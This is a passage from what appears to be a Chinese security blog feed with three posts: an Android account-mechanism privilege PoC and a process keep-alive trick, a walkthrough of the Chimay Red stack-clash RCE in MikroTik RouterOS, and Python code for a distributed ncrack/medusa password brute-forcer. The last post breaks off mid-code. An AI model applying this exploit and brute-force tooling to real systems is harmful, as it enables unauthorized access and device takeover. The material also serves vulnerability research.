<h4 id="复现代码：-1"><a href="#复现代码：-1" class="headerlink" title="复现代码："></a>复现代码：</h4><p>继承了AbstractAccountAuthenticator的类：<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">PendingIntent pending_intent = (PendingIntent) <span class="keyword">options</span>.get(<span class="string">"pendingIntent"</span>);</div><div class="line">Intent intent = <span class="keyword">new</span> Intent();</div><div class="line">intent.setAction(<span class="string">"android.intent.action.BOOT_COMPLETED"</span>);</div><div class="line"><span class="keyword">try</span> &#123;</div><div class="line">    pending_intent.send(context, <span class="number">0</span>, intent, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</div><div class="line">&#125; <span class="keyword">catch</span> (PendingIntent.CanceledException e) &#123;</div><div class="line">    Log.e(<span class="string">"addAccount Exception"</span>, e.toString());</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> <span class="keyword">options</span>;</div></pre></td></tr></table></figure></p>
<p>这里我们在addAccount方法里获取pendingIntent,然后声明一个启动成功Action的Intent，最后让pendingIntent发送带有启动成功Action的广播。由于pendingIntent是系统级别的，所以发出的广播也是系统级别的，于是android系统就会收到该广播，然后执行系统启动成功之后的逻辑。</p>
<h4 id="复现截图：-1"><a href="#复现截图：-1" class="headerlink" title="复现截图："></a>复现截图：</h4><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/15.png" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/16.png" alt=""></p>
<h4 id="漏洞修复：-1"><a href="#漏洞修复：-1" class="headerlink" title="漏洞修复："></a>漏洞修复：</h4><p>Android 5.0的源码中修复了该漏洞，方法是把放入mPendingIntent的intent，由原来简单的new Intent()改为事先经过一系列填充的identityIntent。这样做，就可以防止第三方的Authenticator（主要是针对木马）进行二次填充。修复代码如下：<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Intent identityIntent = new Intent()<span class="comment">;  </span></div><div class="line">identityIntent.setComponent(new ComponentName(<span class="keyword">SHOULD_NOT_RESOLVE, </span><span class="keyword">SHOULD_NOT_RESOLVE)); </span> </div><div class="line">identityIntent.setAction(<span class="keyword">SHOULD_NOT_RESOLVE); </span> </div><div class="line">identityIntent.<span class="keyword">addCategory(SHOULD_NOT_RESOLVE); </span> </div><div class="line">mPendingIntent = PendingIntent.getBroadcast(this, <span class="number">0</span>, identityIntent, <span class="number">0</span>)<span class="comment">;</span></div></pre></td></tr></table></figure></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/17.png" alt=""></p>
<h3 id="系统拉活进程"><a href="#系统拉活进程" class="headerlink" title="系统拉活进程"></a>系统拉活进程</h3><p>之前在做项目的时候，为了保证APP可以在手机长期存活，我找到了利用Android账户同步机制来拉活APP的进程。在华为6.0、4.4的版本测试可以拉活，在oppo5.0版本测试可以拉活，但是在小米6.0下，杀死进程后就无法通过账户机制拉活，我猜测是小米对账户机制进行了修改。</p>
<h4 id="SyncAdapter介绍："><a href="#SyncAdapter介绍：" class="headerlink" title="SyncAdapter介绍："></a>SyncAdapter介绍：</h4><p> Android提供了SyncAdapter类用于需要同步本地数据和在线账户信息的应用，如电子邮件的定时收取、笔记应用的云备份、天气应用的及时同步等。它的优势在于可以根据不同条件自动发起数据传输，比如数据变更，间隔一定时间，或者是每天定时。而且，系统会将暂时不能运行的操作添加到队列里，在可能的情况下重新发起。</p>
<h4 id="漏洞原理：-2"><a href="#漏洞原理：-2" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><p> 因为账户同步服务是系统维护的一个服务，所以我们的同步的进程是跟随系统的生命周期走，这就意味着只要不关机，这个服务会一直运行，帮我们同步账号。我们看一下功能流程图：</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/18.png" alt=""></p>
<p>上图是我总结了Android利用SyncAdapter同步账户的逻辑，而开发者可以随意重写onPerformSync()的内容，因此我们可以在onPerformSync()方法中去开启我们APP的Activity、Service等，一旦启动了Activity、Service之后，就等于拉活了我们APP的进程。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/19.png" alt=""></p>
<h4 id="实现代码："><a href="#实现代码：" class="headerlink" title="实现代码："></a>实现代码：</h4><p>MainActivity类：<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">Bundle </span><span class="keyword">bundle </span>= new <span class="keyword">Bundle();</span></div><div class="line">ContentResolver.setIsSyncable(account, AccountProvider.AUTHORITY, <span class="number">1</span>)<span class="comment">;</span></div><div class="line">ContentResolver.setSyncAutomatically(account, AccountProvider.AUTHORITY, true)<span class="comment">;</span></div><div class="line">ContentResolver.setMasterSyncAutomatically(true)<span class="comment">;</span></div><div class="line">ContentResolver.<span class="keyword">addPeriodicSync(account, </span>AccountProvider.AUTHORITY, <span class="keyword">bundle, </span><span class="number">300</span>)<span class="comment">;//开启同步</span></div><div class="line"></div><div class="line"><span class="keyword">SyncService类：</span></div><div class="line">@Override</div><div class="line">public void onPerformSync(Account account, <span class="keyword">Bundle </span><span class="keyword">bundle, </span>String s, ContentProviderClient contentProviderClient, <span class="keyword">SyncResult </span><span class="keyword">syncResult) </span>&#123;</div><div class="line">            Intent i = new Intent(<span class="keyword">SyncService.this, </span>TestActivity.class)<span class="comment">;//开启活动</span></div><div class="line">            startActivity(i)<span class="comment">;</span></div><div class="line">        &#125;</div></pre></td></tr></table></figure></p>
<p>我们在mainActivity利用ContentResolver去开启账户同步，设置同步周期，然后系统执行同步操作时，会执行onPerformSync()方法，我在该方法中去开启APP中的TestActivity活动。</p>
<h4 id="实现截图："><a href="#实现截图：" class="headerlink" title="实现截图："></a>实现截图：</h4><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/20.png" alt=""><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/21.png" alt=""></p>
<h4 id="漏洞修复：-2"><a href="#漏洞修复：-2" class="headerlink" title="漏洞修复："></a>漏洞修复：</h4><p>由于该机制可定制度太高，而且比较冷门的功能，因此google一直没有去修补这块，不过小米有阉割掉了这里的拉活，而且刚刚用原生Android 8.0系统测了一下，貌似也是拉活不了。8.0以下都可以拉活。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Android账户机制本身意义是google为了方便用户，不需要总是APP登录和验证账户信息，由系统来维护这些账户的验证。换个思路，这就是为攻击者提供了可以利用的提取系统权限的攻击点。我们在之后的研究可以多找找有系统提供的服务或者间接调用了系统服务的功能，这样可以让系统为我们“服务”。<br>目前大多数手机厂商针对于账户机制这些相对冷门的功能没有太大的关注，所以在各自品牌手机的rom包中，对于这些机制也未再进行认真的检验处理，这样也就导致很多原生系统存在的漏洞，在各大手机厂商上面同样可以进行攻击，所以需要系统开发人员认真的关注这些功能。</p>
<p>##参考文档：<br>LAUNCHANYWHERE: ACTIVITY组件权限绕过漏洞解析(GOOGLE BUG 7699048 )：<br><a href="http://blogs.360.cn/360mobile/2014/08/19/launchanywhere-google-bug-7699048/" rel="external nofollow noopener noreferrer" target="_blank">http://blogs.360.cn/360mobile/2014/08/19/launchanywhere-google-bug-7699048/</a></p>
<p>Android BroadcastAnyWhere(Google Bug 17356824)漏洞详细分析：<br><a href="https://blog.csdn.net/l173864930/article/details/41246255/" rel="external nofollow noopener noreferrer" target="_blank">https://blog.csdn.net/l173864930/article/details/41246255/</a></p>
<p>android添加账户源码浅析：<br><a href="http://www.cnblogs.com/vendanner/p/5122865.html" rel="external nofollow noopener noreferrer" target="_blank">http://www.cnblogs.com/vendanner/p/5122865.html</a></p>
<p>broadAnywhere：Broadcast组件权限绕过漏洞（Bug: 17356824）<br><a href="http://blogs.360.cn/360mobile/2014/11/14/broadanywhere-bug-17356824/" rel="external nofollow noopener noreferrer" target="_blank">http://blogs.360.cn/360mobile/2014/11/14/broadanywhere-bug-17356824/</a></p>
<p>Android的账号与同步机制<br><a href="https://blog.csdn.net/hehui1860/article/details/36900775" rel="external nofollow noopener noreferrer" target="_blank">https://blog.csdn.net/hehui1860/article/details/36900775</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Android 2.0中加入了一个新的包android.accounts，该包主要包括了集中式的账户管理API，用以安全地存储和访问认证的令
    
    </summary>
    
      <category term="移动安全" scheme="http://www.future-sec.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="移动安全" scheme="http://www.future-sec.com/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
      <category term="Android" scheme="http://www.future-sec.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>MikroTik RouterOS &lt; 6.38.4 (x86) 远程代码执行漏洞分析</title>
    <link href="http://www.future-sec.com/MikroTik-RouterOS-lt-6.38.4-remote-code-execution.html"/>
    <id>http://www.future-sec.com/MikroTik-RouterOS-lt-6.38.4-remote-code-execution.html</id>
    <published>2018-04-14T16:00:00.000Z</published>
    <updated>2018-06-29T09:01:06.020Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>《Vault 7》是由维基解密从2017年3月7日开始，发布的一系列文件。其中详细描述了美国中央情报局(Central Intelligence Agency)执行电子监视和网络战的细节活动和能力。Chimay Red是Vault 7中泄漏的CIA Hacking Tools中包含的一个用于exploit运行Router OS的MikroTik(MT) 路由器的一个工具，此工具可用来向MT路由器上传HIVE（Vault7中泄漏出的一个CIA远程控制工具）或者shellcode等payload。Vault7泄露的文档中只包含了<a href="https://wikileaks.org/ciav7p1/cms/page_16384604.html" rel="external nofollow noopener noreferrer" target="_blank">工具的使用手册</a>，但此工具并未公开。BigNerd95在github上的<a href="https://github.com/BigNerd95/Chimay-Red" rel="external nofollow noopener noreferrer" target="_blank">Chiamy Red项目</a>根据RouterOS的补丁对Chimay Red中使用的漏洞进行了揭露并给出了poc。</p>
<p>此文档主要是对BigNerd95的Chiamy Red项目中使用的 Stack Clash Remote Code Execution漏洞及给出的exp进行细节分析。 环境搭建及使用的漏洞具体可参考<a href="https://github.com/BigNerd95/Chimay-Red/blob/36faf04e9ffb224811e0ac074a62126fdca7a92f/docs/ChimayRed.pdf" rel="external nofollow noopener noreferrer" target="_blank">这里</a>。此漏洞存在于RouterOS 6.38.4版本以下，在<a href="https://mikrotik.com/download/changelogs/current-release-tree" rel="external nofollow noopener noreferrer" target="_blank">6.38.5版本</a>中被修补。 </p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>从BigNerd95给出的文档中，我们可以知道此漏洞存在于www二进制文件中的Request::readPostData函数中。我们可以使用Chiamy Red项目中的getROSbin.py工具从RouterOS镜像中提取www二进制文件，命令如下：<br><code>$ ./tools/getROSbin.py 6.38.4 x86 /nova/bin/www www_binary</code><br>使用IDA查看Request::readPostData函数 :<img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/1.png" alt="1"></p>
<p>可以看到，该函数先使用Headers::getHeader函数获取content_length字段的值，然后并未对值进行判断就传入了alloca函数，随后使用istream:read函数将content_len_velue长度的数据读取到了当前函数的栈帧中。</p>
<p>alloca函数具体进行的操作如下图:<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/2.png" alt="2"><br>alloca函数将content_len_velue进行对齐之后，在当前栈帧上分配了对应大小的空间，这将允许我们直接控制当前栈帧的栈顶位置。</p>
<p>如果我们传入content_length的值为2147483648[-2147483648]到4294967295[-1]之间的任意值，则栈顶指针将不是向上增长而是向下移动指向已使用的栈区位置，然后istream::read会从socket读取content_len_velue长度的数据到当前栈顶指定的缓冲区内，这将引起栈粉碎。并且由于istream::read的第二个参数类型为uint，istream::read会读取至少2147483648字节的数据到栈上，这很明显会超出当前栈底，在istream::read函数返回之前生成一个SEGFAULT错误。现在看来这似乎是一个不可执行代码的漏洞，那么如何才能达到代码执行的目的呢？<br>可以先看一下Chiamy Red项目中的exp是怎么写的。如下图，先创建两个socket，分别向两个socket发送了指定了content_length的post header数据，并向s1发送了n个‘A’和payload，然后将s2关闭。从注释也可看出，其利用方式和线程栈有关。 </p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/3.png" alt="3"></p>
<p>再来看看Request::readPostData函数是在哪里被调用的，使用IDA查看Request::readPostData的交叉引用发现www中没有引用此函数的位置。现在我们动态调试下，看看此函数在哪里被调用。telnet连接上RouterOS,把RouterOS的ALSR保护关闭掉，然后kill掉www进程之后系统会自动重启www程序（以下所有图片为多次调试www程序所截图像，所以进程号会有所不同，但并不影响我们的分析） </p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/4.png" alt="4"></p>
<p>使用gdbserver附加到www进程上，使用gdb远程调试。 </p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/5.png" alt="5"></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/6.png" alt="6"></p>
<p>我们把断点下在调用alloca函数处 </p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/7.png" alt="7"></p>
<p>然后使用Chiamy Red项目中的exp把payload打到目标上 </p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/8.png" alt="8"></p>
<p>可以看到有两个新线程被创建，并且在线程2中触发了断点，说明Request::readPostData函数是在新线程中被调用的，并且栈顶寄存器指向0x77d86180 </p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/9.png" alt="9"></p>
<p>我们看一下0x77d86180在内存空间的哪个位置 </p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/10.png" alt="10"></p>
<p>可以看到0x77d86180并不位于进程内存空间的栈区，而是位于库文件加载区域中的一段空闲内存空间中，并且我们可以计算出分配给线程2的线程栈内存大小为0x77d87000-0x77d68000=0x1f000=124kb,继续运行www发现在线程3中断点又被触发了一次，且此次的栈顶寄存器指向0x77d66180，可以看到线程3的线程栈位于线程2的线程栈的上方且大小同为0x77d67000-0x77d48000=0x1f000=124kb,中间相隔0x77d68000-0x77d67000=0x1000=4kb的保护区。 </p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/11.png" alt="11"></p>
<p>现在线程栈在内存空间中的布局清楚了。现在从新开启调试，在alloca调用处下断点，continue并且重新打上payload，程序中断在线程2的alloca调用处，向下单步3条指令 </p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/12.png" alt="12"></p>
<p>此时线程3中的断点被触发，并且调试线程切换到了线程3,因为我们现在要调试线程2,所以先把线程3暂停，设置gdb的调度器锁到on状态，然后切换回线程2继续调试 </p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/13.png" alt="13"></p>
<p>单步到sub %eax,%esp指令处查看当前esp的值为0x77d86180，对照进程的内存空间布局，可以看到现在esp依然指向线程2的线程栈内，单步步过sub指令，然后再次查看esp的值为0x77d5d170，现在esp已经指向线程3的线程栈内了<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/14.png" alt="14"></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/15.png" alt="15"></p>
<p>继续向下运行到istream::read函数调用处，查看栈中函数的参数，可以看到read函数会读取0x29000字节的数据到0x77d5d170处，正好是刚才alloca函数调整过的栈顶位置 0x77d5d170 </p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/16.png" alt="16"></p>
<p>继续单步步过read函数，重新查看0x77d5d170处有什么数据，发现此位置的数据并没有更新，read函数读取失败了，我们先把这个问题暂时放在这里，继续我们下面的调试，因为我们主要关注地址偏移量 </p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/17.png" alt="17"></p>
<p>查看下exp脚本都向s1发送了什么数据，注意到发往s1的数据部分是分两次发送的，两次发送期间向s2发送了构造的http头，现在我们来计算一下向s1发送了n个‘A’之后，read函数会读取到多少个‘A’,由脚本的宏定义可以计算出SKIP_SPACE-ALIGN_SIZE-ADDRESS_SIZE=0xfec,read函数在读取0xfec个‘A’之后，edi寄存器指向的位置在0x77d5d170+0xfec=0x77d5e15c，注意read再往后读取的数据就是shellcode了，就是说0x77d5e15c是shellcode的起始位置，并且此位置位于线程3的线程栈内 </p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/18.png" alt="18"></p>
<p>现在切换到线程3,继续调试，看看0x77d5e15c在线程3的线程栈中扮演了什么角色 </p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/19.png" alt="19"></p>
<p>线程3的栈顶在经过调整之后指向0x77d5e170处，此处已经离0x77d5e15c不远了。继续运行到read函数的调用处，查看栈中的数据，发现此时栈顶指针指向0x77d5e160处，离0x77d5e15c只有四个字节，在调用call read指令后将read函数的返回地址存储到0x77d5e15c的位置，刚才分析到0x77d5e15c是shellcode的起始地址，此处可以劫持read函数的返回地址达到任意代码执行的目的。由于线程3的read函数会向0x77d5e170处写入数据，此处内存空间也是存储shellcode的空间，因此，不能向s2发送任何数据http协议的数据部分，否则将会赋盖shellcode，Chiamy Red项目中exp的作者使用close(s2)的方式来让线程3中的read函数返回，以运行shellcode。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/20.png" alt="20"></p>
<p>关于调试过程中出现的read函数读取失败的问题，可能是由于中断的时间太长导致socket超时引起的，直接把断点下在read函数调用下面，直接run至断点处，就能看到read函数读取成功了。</p>
<h2 id="exploit分析"><a href="#exploit分析" class="headerlink" title="exploit分析"></a>exploit分析</h2><p>最后正向梳理下exp作者的利用思路。传入负值可以复写当前线程栈的函数返回地址，但由于read函数的第二个参数类型为uint，写入内存的长度超长会在read函数返回之前就引发段错误导致程序异常退出；由于线程栈内存段是相邻的，且同一进程中的所有线程共享资源，那么可以赋写其他线程栈的函数返回地址，因为alloca函数可以分配栈空间，先通过content_length参数在线程2的线程栈上分配出容纳shellcode的内存空间，然后确定read函数的返回地址的存储位置ADDR，利用content_length调整线程1的线程栈栈顶寄存器指向ADDR之后的地址，然后使用‘A’作填充，使shellcode正好覆盖到ADDR处存储的返回地址达到任意代码执行的目的。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;《Vault 7》是由维基解密从2017年3月7日开始，发布的一系列文件。其中详细描述了美国中央情报局(Central Intelligen
    
    </summary>
    
      <category term="系统安全" scheme="http://www.future-sec.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="系统安全" scheme="http://www.future-sec.com/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>谁是僵尸之王-如何进行高效的分布式爆破</title>
    <link href="http://www.future-sec.com/king-of-zombie.html"/>
    <id>http://www.future-sec.com/king-of-zombie.html</id>
    <published>2018-04-07T16:00:00.000Z</published>
    <updated>2018-06-29T08:59:05.620Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在研发漏洞扫描器的弱口令破解模块时，发现传统的通过字典遍历用户名密码的算法效率过低，当需要大批量高速爆破时，难以满足此类需求，因此需要引入新的算法，本文以一个分布式扫描器的爆破模块为例，演示如何进行高效快速的分布式爆破。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/6172922.jpg" alt="617292"></p>
<h2 id="传统方法"><a href="#传统方法" class="headerlink" title="传统方法"></a>传统方法</h2><p>传统的密码穷举</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15156625175922.jpg" alt=""><br>效率非常低，而且还有可能触发报警  </p>
<h2 id="king-of-zombie"><a href="#king-of-zombie" class="headerlink" title="king of zombie"></a>king of zombie</h2><p>koz (king of zombie) 算法,即首先按照多种算法对用户名密码字典组合进行评分,然后用评分最高的组合去淘汰僵尸主机。</p>
<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><ol>
<li>上游push ncrack任务到队列</li>
<li>koz 节点开始瓜分队列任务,保存为任务列表 (根据cpu,网速来分配多少任务) 。</li>
<li>使用账号密码字典爆破来遍历任务列表,hit中 即从列表中淘汰(字典按评分优先级排序)。</li>
</ol>
<ul>
<li>说明</li>
</ul>
<ol>
<li><p>字典评分按照爆破成功记录次数和蜜罐记录次数来计算,master 端实时更新,koz node 每日定时更新。</p>
</li>
<li><p>淘汰机制具体为先去除一大部分普遍存在的弱口令,例如某一批次中,第一次使用 ubnt/ubnt 来爆破ssh服务,就能淘汰 15% 的任务,第二次使用 root/123456 能淘汰 3% 。</p>
</li>
</ol>
<h3 id="表结构"><a href="#表结构" class="headerlink" title="表结构"></a>表结构</h3><p>pw_koz_level </p>
<table>
<thead>
<tr>
<th>列</th>
<th>类型</th>
<th>注释</th>
</tr>
</thead>
<tbody>
<tr>
<td>id</td>
<td>int(11)</td>
<td>自动增量</td>
</tr>
<tr>
<td>username</td>
<td>varchar(255)</td>
<td>用户名</td>
</tr>
<tr>
<td>password</td>
<td>varchar(255)</td>
<td>密码</td>
</tr>
<tr>
<td>type</td>
<td>varchar(255)</td>
<td>类型</td>
</tr>
<tr>
<td>score</td>
<td>int(11)</td>
<td>评分</td>
</tr>
</tbody>
</table>
<h3 id="更新算法"><a href="#更新算法" class="headerlink" title="更新算法"></a>更新算法</h3><p>目前数据来源有四个<br>第一个  扫描器爆破成功记录  score 值为 10<br>第二个  蜜罐记录   score 值 为 1<br>第三个  渗透进去提取到的有效密码(例如windows 明文)  ,score 10<br>第四个  收集的各种工具扫描字典  score 值为 1</p>
<p>扫描的时候工具score 值来排序,命中一次之后+10 </p>
<p>例如如下字典列表</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15228255230476.jpg" alt=""></p>
<h4 id="master"><a href="#master" class="headerlink" title="master"></a>master</h4><p>推送任务之后使用无状态扫描工具扫描服务和指纹识别</p>
<h4 id="koz-node"><a href="#koz-node" class="headerlink" title="koz node"></a>koz node</h4><p>KozTask 类来保存本地任务队列,接收处的代码为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span>  <span class="title">pop_member</span><span class="params">(self)</span>:</span></div><div class="line">    <span class="keyword">while</span> self.len() &gt;  <span class="number">0</span>:</div><div class="line">        str_member=self.pop()</div><div class="line">        koz_member=ast.literal_eval(str_member)</div><div class="line">        self.list_member[str(koz_member[<span class="string">'name'</span>])].append(koz_member)</div><div class="line">    util.log(<span class="string">"pop koz_member  done count:%d"</span>  % (self.count()),<span class="number">2</span>,<span class="string">'koztask'</span>)</div></pre></td></tr></table></figure>
<p>本地队列处理完毕之后,开始foreach 循环用户名密码组合(根据score 大小优先级)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">koz_levels=get_koz_level()</div><div class="line"><span class="keyword">for</span> koz_level  <span class="keyword">in</span>  koz_levels :</div><div class="line">    koz_queue.queue.clear()</div><div class="line">    <span class="comment">#member=&#123;'name': 'ssh', 'task_id': 1124, 'url': '', 'host': '168.167.45.250', 'version': '', 'type': 'service', 'port': 22&#125;</span></div><div class="line">    <span class="comment">#ncrack.scan(member,koz_level)</span></div><div class="line">    <span class="comment">#break</span></div><div class="line">    <span class="keyword">try</span> :</div><div class="line">        <span class="keyword">for</span> member  <span class="keyword">in</span>   koz_task.list_member[koz_level[<span class="string">'type'</span>]] :</div><div class="line">            koz_queue.put(&#123;<span class="string">'member'</span>:member,<span class="string">'level'</span>:koz_level&#125;)</div><div class="line"></div><div class="line">        work_manager = WorkManager(koz_queue, config.koz_thread)  <span class="comment"># thread</span></div><div class="line">        work_manager.wait_allcomplete()</div><div class="line">    <span class="keyword">except</span> Exception, e:</div><div class="line">        util.log(<span class="string">"error info:"</span>+str(e),<span class="number">3</span>,<span class="string">'koz_node'</span>)</div><div class="line">    util.log(<span class="string">'koz_member len:%d'</span> % (koz_task.count()),<span class="number">1</span>,<span class="string">'koz_node'</span>)</div></pre></td></tr></table></figure>
<p>当扫描出来结果时,直接把它从 koz_member 队列里面remove 掉,如此循环往复,直到跑完所有的密码。<br>remove </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">    <span class="keyword">while</span>  <span class="number">1</span>:</div><div class="line">        <span class="keyword">if</span> self.work_queue.empty() == <span class="keyword">True</span>:</div><div class="line">            <span class="keyword">break</span></div><div class="line">        task = self.work_queue.get(block=<span class="keyword">False</span>)</div><div class="line">        <span class="keyword">if</span> ncrack.scan(task[<span class="string">'member'</span>],task[<span class="string">'level'</span>])  != <span class="keyword">False</span> :</div><div class="line">            koz_type=task[<span class="string">'member'</span>][<span class="string">'name'</span>]</div><div class="line">            koz_task.list_member[koz_type].remove(task[<span class="string">'member'</span>])</div></pre></td></tr></table></figure>
<h3 id="爆破算法"><a href="#爆破算法" class="headerlink" title="爆破算法"></a>爆破算法</h3><p>负责爆破的为ncrack 模块,调用的爆破工具有  medusa,ncrack。<br>部分实现</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(target,level)</span>:</span></div><div class="line">    <span class="keyword">if</span> target[<span class="string">'name'</span>]  == <span class="string">'ms-wbt-server'</span>  <span class="keyword">or</span>  target[<span class="string">'name'</span>]  == <span class="string">'telnet'</span> :</div><div class="line">        str_command = <span class="string">"ncrack --user %s --pass %s  %s:%d "</span>  %  (level[<span class="string">'username'</span>],level[<span class="string">'password'</span>],target[<span class="string">'host'</span>],target[<span class="string">'port'</span>])</div><div class="line">        str_ret=str(sys_exec([<span class="string">'ncrack'</span>, <span class="string">'--user'</span>,level[<span class="string">'username'</span>], <span class="string">'--pass'</span>, level[<span class="string">'password'</span>], target[<span class="string">'host'</span>]+<span class="string">':'</span>+ str(target[<span class="string">'port'</span>])]))</div><div class="line">    <span class="keyword">else</span> :</div><div class="line">        str_command = <span class="string">"medusa -u %s -p %s -h %s -n %d  -M %s"</span> % (level[<span class="string">'username'</span>], level[<span class="string">'password'</span>], target[<span class="string">'host'</span>], target[<span class="string">'port'</span>], target[<span class="string">'name'</span>])</div><div class="line">        str_ret=str(sys_exec([<span class="string">'medusa'</span>,<span class="string">'-u'</span>,level[<span class="string">'username'</span>],<span class="string">'-p'</span>,level[<span class="string">'password'</span>],<span class="string">'-h'</span>,target[<span class="string">'host'</span>],<span class="string">'-n'</span>,str(target[<span class="string">'port'</span>]),<span class="string">'-M'</span>,target[<span class="string">'name'</span>]]))</div><div class="line">    </div><div class="line">    util.log(str_command, <span class="number">2</span>, <span class="string">'ncrack'</span>)</div><div class="line">    <span class="comment">#need  change </span></div><div class="line">    <span class="keyword">if</span> <span class="string">'ACCOUNT FOUND'</span> <span class="keyword">in</span> str_ret  <span class="keyword">or</span>  <span class="string">'credentials'</span>  <span class="keyword">in</span> str_ret:</div><div class="line">        str_data=<span class="string">'[%s] %s %s:%s'</span>   %  (target[<span class="string">'name'</span>],target[<span class="string">'host'</span>],level[<span class="string">'username'</span>],level[<span class="string">'password'</span>])</div><div class="line">        util.log(<span class="string">'ncrack taskid:%d target:%s service:%s succeed'</span> % (target[<span class="string">'task_id'</span>], target[<span class="string">'host'</span>], target[<span class="string">'name'</span>]), <span class="number">1</span>, <span class="string">'ncrack'</span>)</div><div class="line">        <span class="keyword">return</span> report(target,str_data)</div><div class="line">        </div><div class="line">    <span class="keyword">else</span>  :</div><div 